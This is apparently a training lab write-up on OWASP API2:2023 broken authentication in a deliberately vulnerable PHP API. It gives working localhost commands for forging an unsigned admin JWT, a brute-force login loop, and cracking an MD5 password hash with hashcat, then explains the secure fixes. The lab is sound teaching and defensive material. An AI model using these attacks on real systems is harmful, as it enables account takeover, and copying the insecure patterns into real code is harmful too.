# API2:2023 — Broken Authentication

**Module file:** `php-api/src/modules/auth.php`  
**Vulnerable endpoints:** `POST /api/auth/login`, `GET /api/auth/profile`  
**Secure endpoint:** `GET /api/auth/profile/secure`

## What This Vulnerability Is

Broken Authentication covers flaws in how the API verifies identity. This module demonstrates three distinct broken authentication weaknesses:

1. **JWT signature not verified** — the API decodes and trusts a JWT without checking the HMAC signature. An attacker can craft any token with any payload.
2. **Weak password hashing** — passwords are stored as MD5 hashes, which can be reversed in milliseconds with precomputed rainbow tables.
3. **No brute-force protection** — the login endpoint has no rate limiting or account lockout, so attackers can try unlimited password combinations.

---

## The Exploit — Step by Step

### Attack 1 — JWT Forgery (No Signature Verification)

The `GET /api/auth/profile` endpoint accepts any JWT and trusts its payload without verifying the HMAC-SHA256 signature.

#### Step 1 — Understand the JWT structure

A JWT has three parts: `HEADER.PAYLOAD.SIGNATURE`

The header and payload are just base64url-encoded JSON. The signature is computed by the server using `JWT_SECRET`. The vulnerable endpoint ignores the signature entirely.

#### Step 2 — Craft a forged token

```bash
# Build a malicious payload claiming to be admin with user_id=99
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"user_id":99,"username":"hacker","role":"admin","exp":9999999999}' \
  | base64 | tr -d '=' | tr '+/' '-_')

# Append any fake signature — the server never checks it
FORGED_TOKEN="${HEADER}.${PAYLOAD}.thisisafakesignature"
echo "Forged token: $FORGED_TOKEN"
```

#### Step 3 — Use the forged token on the vulnerable endpoint

```bash
curl http://localhost:8080/api/auth/profile \
  -H "Authorization: Bearer $FORGED_TOKEN"
```
#### Step 4 — Try the same token on the secure endpoint

```bash
curl http://localhost:8080/api/auth/profile/secure \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### Attack 2 — Credential Brute Force

The login endpoint performs no rate limiting. An attacker can make thousands of attempts without being blocked.

```bash
# Try common passwords against alice's account
for PASS in password password123 alice123 admin 123456 letmein; do
  RESULT=$(curl -s -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"alice\",\"password\":\"$PASS\"}")
  echo "$PASS -> $RESULT"
done
```

One of these attempts will succeed and return a valid JWT.
*more appropriate method could be with a dictionary or online refernce*

### Attack 3 — MD5 Hash Cracking

After extracting password hashes from another vulnerability (e.g. BOLA or BOPLA), an attacker can crack them offline:

```bash
# alice's MD5 hash from the database: 482c811da5d5b4bc6d497ffa98491e38
# Run against rockyou.txt wordlist:
hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt
# Cracks in under 1 second: password123
```

## The Vulnerable Code

Two weaknesses here: `md5()` is used instead of `password_verify()` with bcrypt, and there is no rate limiting around this block.

### Profile endpoint (insecure)

`decode_jwt_insecure()` is called, which splits the token on `.` and base64-decodes the middle section. It never touches the third section — the signature. The payload is returned as trusted data.

---

## The Fix — Exactly What Changed

### What the secure profile endpoint does differently

**Changed — `decode_jwt_insecure` replaced with `decode_jwt_secure`:**  
This is the single most important change. `decode_jwt_secure()` recomputes the expected HMAC-SHA256 signature:

It takes the header and payload, runs them through HMAC-SHA256 with `JWT_SECRET`, and base64url-encodes the result. It then compares this computed signature against `$parts[2]` — the signature in the token — using `hash_equals()`. If they differ by even one character, the function returns `null` and the endpoint responds with 401. A forged token's signature will never match because the attacker does not know `JWT_SECRET`.

**Added — expiry check:**  
```php
if ($payload['exp'] < time()) {
    json_response(['error' => 'Token expired'], 401);
}
```
The vulnerable endpoint never checked `exp`. A stolen token would remain valid indefinitely. The secure endpoint explicitly compares `exp` (a Unix timestamp set at login) against the current time.

